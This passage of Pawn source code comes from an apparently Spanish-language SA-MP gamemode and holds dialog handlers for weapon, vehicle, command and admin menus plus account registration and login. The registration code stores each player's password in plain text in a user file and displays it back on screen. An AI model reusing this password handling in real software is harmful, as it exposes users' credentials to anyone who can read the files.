				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				if(ArmasProhibidas[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el guerra deathmatch para usar esta arma.");
				GivePlayerWeapon(playerid,38,5000);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Minigun!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 3)
			{
				if(ArmasProhibidas[playerid] == 1) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes estar en el guerra deathmatch para usar esta arma.");
				GivePlayerWeapon(playerid,37,2500);
				SendClientMessage(playerid,red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Lanza Llamas!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			SavePlayer(playerid);
		}
		else ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
	if(dialogid == 8)
	{
		if(response)
		{
			if(listitem == 0)
			{
				GivePlayerWeapon(playerid, 1 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Puño Americano!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 1)
			{
				GivePlayerWeapon(playerid, 2 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Palo de Golf!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 2)
			{
				GivePlayerWeapon(playerid, 3 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Porra de Policia!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 3)
			{
				GivePlayerWeapon(playerid, 4 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Cuchillo!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 4)
			{
				GivePlayerWeapon(playerid, 5 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Bate de Beisboll!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 5)
			{
				GivePlayerWeapon(playerid, 6 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Pala!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 6)
			{
				GivePlayerWeapon(playerid, 7 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Palo de Billar!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 7)
			{
				GivePlayerWeapon(playerid, 8 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Katana!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 8)
			{
				GivePlayerWeapon(playerid, 9 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido una {919770}Motosierra!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 9)
			{
				GivePlayerWeapon(playerid, 10 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Consolador Rosa!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 10)
			{
				GivePlayerWeapon(playerid, 11 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Mini Consolador Blanco!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 11)
			{
				GivePlayerWeapon(playerid, 12 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Consolador Blanco!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 12)
			{
				GivePlayerWeapon(playerid, 13 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Mini Consolador Negro!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 13)
			{
				GivePlayerWeapon(playerid, 14 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Ramo de Flores!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			if(listitem == 14)
			{
				GivePlayerWeapon(playerid, 15 , 1);
				SendClientMessage(playerid, red, "|Info| »{EAEAEA} ¡Has obtenido un {919770}Baston!");
				ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
			}
			SavePlayer(playerid);
		}
		else ShowPlayerDialog(playerid, Armas, DIALOG_STYLE_LIST, "Armas", "{FF0000}*{FFFFFF} Fusiles\n{FF0000}*{FFFFFF} Metralletas\n{FF0000}*{FFFFFF} Pistolas\n{FF0000}*{FFFFFF} Rifles\n{FF0000}*{FFFFFF} Escopetas\n{FF0000}*{FFFFFF} Granadas y Explosivos\n{FF0000}*{FFFFFF} Armas Pesadas\n{FF0000}*{FFFFFF} Cuerpo a Cuerpo", "Seleccionar", "Salir");
	}
    if(dialogid == ChatColor)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_cnegro(playerid,"\1");
			}
			if(listitem == 1)
			{
				cmd_crojo(playerid,"\1");
			}
			if(listitem == 2)
			{
				cmd_cazul(playerid,"\1");
			}
			if(listitem == 3)
			{
				cmd_cverde(playerid,"\1");
			}
			if(listitem == 4)
			{
				cmd_camarillo(playerid,"\1");
			}
			if(listitem == 5)
			{
				cmd_crosa(playerid,"\1");
			}
			if(listitem == 6)
			{
				cmd_cceleste(playerid,"\1");
			}
			if(listitem == 7)
			{
				cmd_cnaranja(playerid,"\1");
			}
			if(listitem == 8)
			{
				cmd_cvioleta(playerid,"\1");
			}
			if(listitem == 9)
			{
				cmd_cdorado(playerid,"\1");
			}
			if(listitem == 10)
			{
				cmd_cmarron(playerid,"\1");
			}
			if(listitem == 11)
			{
				cmd_cgris(playerid,"\1");
			}
			if(listitem == 12)
			{
				cmd_dchatcolor(playerid,"\1");
			}
		}
	}
    if(dialogid == OtherCmds2)
	{
		if(response)
		{
			new Othercmds[1600];
			strcat(Othercmds, "{C0C0C0}/KILL\t\t{FF0000}    PARA SUICIDARTE.\n");
			strcat(Othercmds, "{C0C0C0}/CLIMAS\t{FF0000}    PARA CAMBIAR EL CLIMA.\n");
			strcat(Othercmds, "{C0C0C0}/PM\t\t{FF0000}    PARA ENVIAR MENSAJES PRIVADOS.\n");
			strcat(Othercmds, "{C0C0C0}/APM\t\t{FF0000}    PARA ACTIVAR LOS MENSAJES PRIVADOS.\n");
			strcat(Othercmds, "{C0C0C0}/DPM\t\t{FF0000}    PARA DESACTIVAR LOS MENSAJES PRIVADOS.\n");
			strcat(Othercmds, "{C0C0C0}/CAMBIARPASS\t{FF0000}    PARA CAMBIAR LA CONTRASEÑA DE TU CUENTA.\n");
			strcat(Othercmds, "{C0C0C0}/STATS\t\t{FF0000}    PARA VER TUS ESTADISTICAS O LAS DE UN JUGADOR.\n");
			strcat(Othercmds, "{C0C0C0}/STATS2\t\t{FF0000}    PARA VER LAS ESTADISTICAS DE UN JUGADOR OFFLINE.\n");
			strcat(Othercmds, "{C0C0C0}/ADMINS\t{FF0000}    PARA VER LA LISTA DE ADMINS CONECTADOS.\n");
			strcat(Othercmds, "{C0C0C0}/REPORT\t{FF0000}    PARA REPORTAR A UN NIÑO CON MODS/HACKS.\n");
			strcat(Othercmds, "{C0C0C0}/GUARDARPOS\t{FF0000}    PARA GUARDAR TU POSICION ACTUAL.\n");
			strcat(Othercmds, "{C0C0C0}/CARGARPOS\t{FF0000}    PARA CARGAR LA POSICION GUARDADA.\n");
			strcat(Othercmds, "{C0C0C0}/ROB\t\t{FF0000}    PARA ROBARLE DINERO A UN JUGADOR.\n");
			strcat(Othercmds, "{C0C0C0}/INFOVIP\t{FF0000}    PARA VER LOS REQUISITOS NECESARIOS PARA SER VIP.\n");
			strcat(Othercmds, "{C0C0C0}/TCAMPER\t{FF0000}    PARA TUNEAR TU VEHICULO CAMPER.\n");
			strcat(Othercmds, "{C0C0C0}/ANIMS\t\t{FF0000}    COMANDOS DE ANIMACION.\n");
			strcat(Othercmds, "{C0C0C0}/NEONES\t{FF0000}    NEONES PARA TU VEHICULO.\n");
			strcat(Othercmds, "{C0C0C0}/CARRERA\t{FF0000}    PARA JUGAR UNA CARRERA.\n");
			strcat(Othercmds, "{C0C0C0}/DERBY\t\t{FF0000}    PARA JUGAR EL DERBY.\n");
			strcat(Othercmds, "{C0C0C0}/MENUIMAGEN\t{FF0000}    LOS MENUS TE SALDRAN CON IMAGENES CLICKEABLES.\n");
			strcat(Othercmds, "{C0C0C0}/SEXO\t\t{FF0000}    ANIMACIONES DE SEXO.\n");
			strcat(Othercmds, "{C0C0C0}/SEXO2\t\t{FF0000}    MAS ANIMACIONES DE SEXO.\n");
			ShowPlayerDialog(playerid, OtherCmds3, DIALOG_STYLE_MSGBOX, "{FF0000}OTROS COMANDOS {FFFFFF}[2/3]", Othercmds, ">>", "Salir");
		}
	}
	if(dialogid == OtherCmds3)
	{
		if(response)
		{
			new OtherCmds[1600];
			strcat(OtherCmds, "{C0C0C0}/VCONTROL      \t{FF0000}PARA TENER EL CONTROL DE TU VEHICULO.\n");
			strcat(OtherCmds, "{C0C0C0}/DROGAS        \t{FF0000}PARA CONSUMIR DROGAS.");
			ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, "{FF0000}OTROS COMANDOS {FFFFFF}[3/3]",OtherCmds,"Salir","");
		}
	}
	if(dialogid == Comandos)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_housecmds(playerid,"\1");
			}
			if(listitem == 1)
			{
				cmd_bizcmds(playerid,"\1");
			}
			if(listitem == 2)
			{
				cmd_vehcmds(playerid,"\1");
			}
			if(listitem == 3)
			{
				cmd_bankcmds(playerid,"\1");
			}
			if(listitem == 4)
			{
				cmd_othercmds(playerid,"\1");
			}
			if(listitem == 5)
			{
				cmd_vipcmds(playerid,"\1");
			}
			if(listitem == 6)
			{
				cmd_admincmds(playerid,"\1");
			}
		}
	}
	if(dialogid == AdminCmds)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_level1(playerid,"\1");
			}
			if(listitem == 1)
			{
				cmd_level2(playerid,"\1");
			}
			if(listitem == 2)
			{
				cmd_level3(playerid,"\1");
			}
			if(listitem == 3)
			{
				cmd_level4(playerid,"\1");
			}
			if(listitem == 4)
			{
				cmd_level5(playerid,"\1");
			}
			if(listitem == 5)
			{
				cmd_level8(playerid,"\1");
			}
			if(listitem == 6)
			{
				cmd_level7(playerid,"\1");
			}
			if(listitem == 7)
			{
				cmd_level8(playerid,"\1");
			}
			if(listitem == 8)
			{
				cmd_level9(playerid,"\1");
			}
			if(listitem == 9)
			{
				cmd_level10(playerid,"\1");
			}
		}
	}
	if(dialogid == VipCmds)
	{
		if(response)
		{
			if(listitem == 0)
			{
				cmd_vlevel1(playerid,"\1");
			}
			if(listitem == 1)
			{
				cmd_vlevel2(playerid,"\1");
			}
			if(listitem == 2)
			{
				cmd_vlevel3(playerid,"\1");
			}
		}
	}
	if(dialogid == REGISTRO)
	{
	    if(!response) return Kick(playerid);
		if(response)
		{
            if (strlen(inputtext) < 4 || strlen(inputtext) > 50) return ShowPlayerDialog(playerid, REGISTRO, DIALOG_STYLE_INPUT, "{FFFFFF}Registro", "{FFFFFF}Ingresa una contraseña mayor a 3 digitos.", "Registrar", "");
		    if (udb_Create(PlayerName2(playerid),inputtext))
			{
  	        new file[256],rname[MAX_PLAYER_NAME], tmp3[100], Register[200];
    	    new strdate[20], year,month,day;
		    getdate(year, month, day);
		    GetPlayerName(playerid,rname,sizeof(rname));
		    format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(rname));
     	    GetPlayerIp(playerid,tmp3,100);
		    dini_Set(file,"ip",tmp3);
            //dini_Set(file,"password",params);
            dini_Set(file, "password",inputtext);
   	        dUserSetINT(PlayerName2(playerid)).("registered",1);
   	    	format(strdate, sizeof(strdate), "%d/%d/%d",day,month,year);
	    	dini_Set(file,"RegisteredDate",strdate);
	    	dUserSetINT(PlayerName2(playerid)).("loggedin",1);
	    	dUserSetINT(PlayerName2(playerid)).("banned",0);
	    	dUserSetINT(PlayerName2(playerid)).("level",0);
	    	dUserSetINT(PlayerName2(playerid)).("vip",0);
	        dUserSetINT(PlayerName2(playerid)).("LastOn",0);
        	dUserSetINT(PlayerName2(playerid)).("money",0);
    	    dUserSetINT(PlayerName2(playerid)).("kills",0);
	   	    dUserSetINT(PlayerName2(playerid)).("deaths",0);
	   	    dUserSetINT(PlayerName2(playerid)).("twin",0);
	   	    dUserSetINT(PlayerName2(playerid)).("rwin",0);
		    dUserSetINT(PlayerName2(playerid)).("Bank",PlayerInfo[playerid][bank]);
		    dUserSetINT(PlayerName2(playerid)).("hours",0);
		    dUserSetINT(PlayerName2(playerid)).("minutes",0);
		    dUserSetINT(PlayerName2(playerid)).("seconds",0);
	        PlayerInfo[playerid][LoggedIn] = 1;
	        PlayerInfo[playerid][Registered] = 1;
	        SavePlayer(playerid);
	    	dUserSetINT(PlayerName2(playerid)).("bowner",0);
	    	dUserSetINT(PlayerName2(playerid)).("bowned",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowned",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowner",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowned2",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowner2",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowned3",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowner3",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowned4",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowner4",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowned5",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowner5",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowned6",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowner6",0);
	       	dUserSetINT(PlayerName2(playerid)).("vowned7",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowner7",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowned8",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowner8",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowned9",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowner9",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowned10",0);
	   	    dUserSetINT(PlayerName2(playerid)).("vowner10",0);
	   	    dUserSetINT(PlayerName2(playerid)).("Houseid", -255);
		    dUserSetINT(PlayerName2(playerid)).("Rentid", -255);
		    dUserSetINT(PlayerName2(playerid)).("SpawnX", 0);
		    dUserSetINT(PlayerName2(playerid)).("SpawnY", 0);
	    	dUserSetINT(PlayerName2(playerid)).("SpawnZ", 0);
    		dUserSetINT(PlayerName2(playerid)).("SpawnInt", 0);
	    	LoginPlayer(playerid);
	    	LoadPlayer(playerid);
	        PlayerInfo[playerid][LoggedIn] = 1;
	        PlayerInfo[playerid][Registered] = 1;
	        GivePlayerMoney(playerid, 100000);
            format(Register,sizeof(Register),"{FF0000}*{FFFFFF} Te has registrado correctamente.\n\n{0080FF}Nick: {FFFFFF}%s\n{0080FF}Pass: {FFFFFF}%s\n{0080FF}Ip: {FFFFFF}%s",rname, inputtext, tmp3);
            ShowPlayerDialog(playerid,5423,DIALOG_STYLE_MSGBOX," {FFFFFF}Registro",Register,"Aceptar","");
		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
            return 1;
			}
			else
			{
				Kick(playerid);
			}
		}
		return 1;
	}
    if(dialogid == INGRESO)
    {
  		if(!response) return  Kick(playerid);
		if(response)
		{
		    if (udb_CheckLogin(PlayerName2(playerid),inputtext))
			{
			   	new file[256], tmp3[100], lname[MAX_PLAYER_NAME];
			   	GetPlayerName(playerid,lname,sizeof(lname));
	   		   	format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(lname));
   			   	GetPlayerIp(playerid,tmp3,100);
	   		   	dini_Set(file,"ip",tmp3);
			   	LoginPlayer(playerid);
			   	LoadPlayer(playerid);
	   		    PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
				if(PlayerInfo[playerid][Level] > 0)
				{
					format(string,sizeof(string),"|Cuenta| »{EAEAEA} Te has identificado correctamente. {0080FF}[Nivel %d] {00FF00}[Nivel Vip: %d]", PlayerInfo[playerid][Level],PlayerInfo[playerid][Vip] );
					SendClientMessage(playerid,red,string);
					return 1;
		       	} else return SendClientMessage(playerid,red,"|Cuenta| »{EAEAEA} Te has identificado correctamente.");
			}
			else
			{
			    PlayerInfo[playerid][FailLogin]++;
			    format(string, sizeof(string), "{FFFFFF}Contraseña incorrecta.\n\n{FFFFFF}Max. Intentos: {20B3FF}%d.\n{FFFFFF}Intento Numero:{20B3FF} %d.", MAX_FAIL_LOGINS,PlayerInfo[playerid][FailLogin]);
				ShowPlayerDialog(playerid, INGRESO2, DIALOG_STYLE_INPUT,"{FFFFFF}Ingreso",string,"Acceder","");
				return 1;
			}
		}
		return 1;
	}
	if(dialogid == DIALOGID3+24)
	{
		if(response)
		{
			switch ( listitem )
			{
				case 0 : ShowPlayerDialog( playerid, DIALOGID3+25, DIALOG_STYLE_LIST, "Aviones", "Andromada\nAT-400\nBeagle\nCropduster\nDodo\nNevada\nRustler\nShamal\nSkimmer\nStuntplane", "Seleccionar", "Cancelar" );
				case 1 : ShowPlayerDialog( playerid, DIALOGID3+26, DIALOG_STYLE_LIST, "Helicopteros", "Cargobob\nLeviathan\nMaverick\nNews Maverick\nPolice Maverick\nRaindance\nSparrow", "Seleccionar", "Cancelar" );
				case 2 : ShowPlayerDialog( playerid, DIALOGID3+27, DIALOG_STYLE_LIST, "Motos", "BF-400\nBike\nBMX\nFaggio\nFCR-900\nFreeway\nMountain Bike\nNRG-500\nPCJ-600\nPizzaboy\nQuad\nSanchez\nWayfarer", "Seleccionar", "Cancelar" );
				case 3 : ShowPlayerDialog( playerid, DIALOGID3+28, DIALOG_STYLE_LIST, "Convertibles", "Comet\nFeltzer\nStallion\nWindsor", "Seleccionar", "Cancelar" );
				case 4 : ShowPlayerDialog( playerid, DIALOGID3+29, DIALOG_STYLE_LIST, "Industrial", "Benson\nBobcat\nBurrito\nBoxville\nBoxburg\nCement Truck\nDFT-30\nFlatbed\nLinerunner\nMule\nNewsvan\nPacker\nPetrol Tanker\nPony\nRoadtrain\nRumpo\nSadler\nSadler Shit\nTopfun\nTractor\nTrashmaster\nUtility Van\nWalton\nYankee\nYosemite", "Seleccionar", "Cancelar" );
				case 5 : ShowPlayerDialog( playerid, DIALOGID3+30, DIALOG_STYLE_LIST, "Lowriders", "Blade\nBroadway\nRemington\nSavanna\nSlamvan\nTahoma\nTornado\nVoodoo", "Seleccionar", "Cancelar" );
				case 6 : ShowPlayerDialog( playerid, DIALOGID3+31, DIALOG_STYLE_LIST, "Todoterreno", "Bandito\nBF Injection\nDune\nHuntley\nLandstalker\nMesa\nMonster\nMonster A\nMonster B\nPatriot\nRancher A\nRancher B\nSandking", "Seleccionar", "Cancelar" );
				case 7 : ShowPlayerDialog( playerid, DIALOGID3+32, DIALOG_STYLE_LIST, "Servicio público", "Ambulance\nBarracks\nBus\nCabbie\nCoach\nCop Bike (HPV-1000)\nEnforcer\nFBI Rancher\nFBI Truck\nFiretruck\nFiretruck LA\nPolice Car (LSPD)\nPolice Car (LVPD)\nPolice Car (SFPD)\nRanger\nS.W.A.T\nTaxi", "Seleccionar", "Cancelar" );
				case 8 : ShowPlayerDialog( playerid, DIALOGID3+33, DIALOG_STYLE_LIST, "Saloons", "Admiral\nBloodring Banger\nBravura\nBuccaneer\nCadrona\nClover\nElegant\nElegy\nEmperor\nEsperanto\nFortune\nGlendale Shit\nGlendale\nGreenwood\nHermes\nIntruder\nMajestic\nManana\nMerit\nNebula\nOceanic\nPicador\nPremier\nPrevion\nPrimo\nSentinel\nStafford\nSultan\nSunrise\nTampa\nVincent\nVirgo\nWillard\nWashington", "Seleccionar", "Cancelar" );
				case 9 : ShowPlayerDialog( playerid, DIALOGID3+34, DIALOG_STYLE_LIST, "Deportivos", "Alpha\nBanshee\nBlista Compact\nBuffalo\nBullet\nCheetah\nClub\nEuros\nFlash\nHotring Racer\nHotring Racer A\nHotring Racer B\nInfernus\nJester\nPhoenix\nSabre\nSuper GT\nTurismo\nUranus\nZR-350", "Seleccionar", "Cancelar" );
				case 10 : ShowPlayerDialog( playerid, DIALOGID3+35, DIALOG_STYLE_LIST, "Vagones", "Moonbeam\nPerenniel\nRegina\nSolair\nStratum", "Seleccionar", "Cancelar" );
				case 11 : ShowPlayerDialog( playerid, DIALOGID3+36, DIALOG_STYLE_LIST, "Barcos", "Coastguard\nDinghy\nJetmax\nLaunch\nMarquis\nPredator\nReefer\nSpeeder\nSquallo\nTropic", "Seleccionar", "Cancelar" );
				case 12 : ShowPlayerDialog( playerid, DIALOGID3+37, DIALOG_STYLE_LIST, "Trailers", "Article Trailer\nArticle Trailer 2\nArticle Trailer 3\nBaggage Trailer A\nBaggage Trailer B\nFarm Trailer\nFreight Flat Trailer (Train)\nFreight Box Trailer (Train)\nPetrol Trailer\nStreak Trailer (Train)\nStairs Trailer\nUtility Trailer", "Seleccionar", "Cancelar" );
